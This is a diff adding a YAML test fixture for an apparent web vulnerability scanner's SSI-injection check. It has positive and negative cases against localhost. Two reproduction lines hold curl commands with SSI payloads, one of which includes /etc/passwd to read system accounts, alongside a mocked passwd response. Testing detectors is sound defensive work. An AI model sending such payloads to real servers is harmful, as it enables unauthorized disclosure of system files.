@@ -1,0 +1,48 @@
+# G.1/组 D fixture：SSI 注入（check 型）正反例。
+# 引擎判定：攻击响应出现 /etc/passwd 特征(root:x:0:0:)、DATE_LOCAL 回显或 errmsg Token。
+module: vulnclaw.engines.web_advanced_engines
+class: SSIInjectionEngine
+engine: ssi_injection
+
+cases:
+  - id: ssi_passwd_include
+    method: check
+    expect: positive
+    url: http://127.0.0.1:8080/page?file=x
+    param: file
+    parsed_query: "file=x"
+    normal_resp: [200, "content ok", {}]
+    responses:
+      /page:
+        status: 200
+        body: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:"
+    evidence_contains: "root:x:0:0:"
+    reproduction: "curl --get 'http://127.0.0.1:8080/page' --data-urlencode 'file=<!--#include virtual=\"/etc/passwd\"-->'"
+
+  - id: ssi_benign_template
+    method: check
+    expect: negative
+    url: http://127.0.0.1:8080/page?file=x
+    param: file
+    parsed_query: "file=x"
+    normal_resp: [200, "content ok", {}]
+    responses:
+      /page:
+        status: 200
+        body: "content ok"
+    evidence_contains: ""
+    reproduction: ""
+
+  - id: ssi_date_local_echo
+    method: check
+    expect: positive
+    url: http://127.0.0.1:8080/page?file=x
+    param: file
+    parsed_query: "file=x"
+    normal_resp: [200, "page v1", {}]
+    responses:
+      /page:
+        status: 200
+        body: "rendered: Wed, 01-Oct-2026 12:34:56 GMT"
+    evidence_contains: "01-Oct-"
+    reproduction: "curl --get 'http://127.0.0.1:8080/page' --data-urlencode 'file=<!--#echo var=\"DATE_LOCAL\"-->'"
